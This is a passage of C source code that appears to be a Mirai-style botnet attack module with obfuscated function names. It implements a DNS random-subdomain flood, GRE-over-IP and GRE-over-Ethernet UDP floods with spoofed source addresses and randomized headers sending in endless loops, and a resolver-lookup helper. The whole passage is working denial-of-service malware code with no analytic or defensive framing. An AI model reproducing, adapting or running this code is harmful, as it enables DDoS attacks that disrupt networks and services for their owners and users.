        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8);
        dnsh->qdcount = htons(1);
        *qname++ = data_len;
        qname += data_len;
        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1);
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;
        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;
            rand_alphastr((uint8_t *)qrand, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== greip ===== */

void aP5Kp4u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag, data_rand, gcip;
    port_t sport, dport;
    int data_len;
    uint32_t source_ip;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    gcip = Cn6pZ7t(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    fd = _ES7Jr7U(IPPROTO_TCP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof(char *));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
                     source_ip, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greh->protocol = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== greeth ===== */

void yQ6Ut4X(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag, data_rand, gcip;
    port_t sport, dport;
    int data_len;
    uint32_t source_ip;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    gcip = Cn6pZ7t(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    fd = _ES7Jr7U(IPPROTO_TCP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof(char *));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        ethh = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(ethh + 1);
        udph = (struct udphdr *)(greiph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
                     source_ip, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greh->protocol = htons(PROTO_GRE_TRANS_ETH);
        ethh->h_proto = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
            ent1 = rand_next();
            ent2 = rand_next();
            ent3 = rand_next();
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);
            util_memcpy(ethh->h_source, (char *)&ent2, 4);
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2);
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== DNS resolver ===== */

static ipv4_t _hU2VN8X(void)
{
    /* Try /etc/resolv.conf first */
    int fd = open("/etc/resolv.conf", O_RDONLY);
    if (fd >= 0)
    {
        char buf[2048];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            char *p;
            buf[n] = '\0';
            p = strstr(buf, "nameserver");
            if (p)
            {
                p += 10;
                while (*p == ' ' || *p == '\t') p++;
                {
                    char ip[32];
                    int i = 0;
                    while (*p && *p != '\n' && *p != ' ' && i < 31)
                        ip[i++] = *p++;
                    ip[i] = '\0';
                    if (i > 0)
                        return inet_addr(ip);
                }
            }
        }
    }
    /* Fallback to public resolvers */
    switch (rand_next() % 4)
    {
    case 0: return INET_ADDR(8,8,8,8);
    case 1: return INET_ADDR(74,82,42,42);
    case 2: return INET_ADDR(64,6,64,6);
    case 3: return INET_ADDR(4,2,2,2);
    }
    return INET_ADDR(8,8,8,8);
}
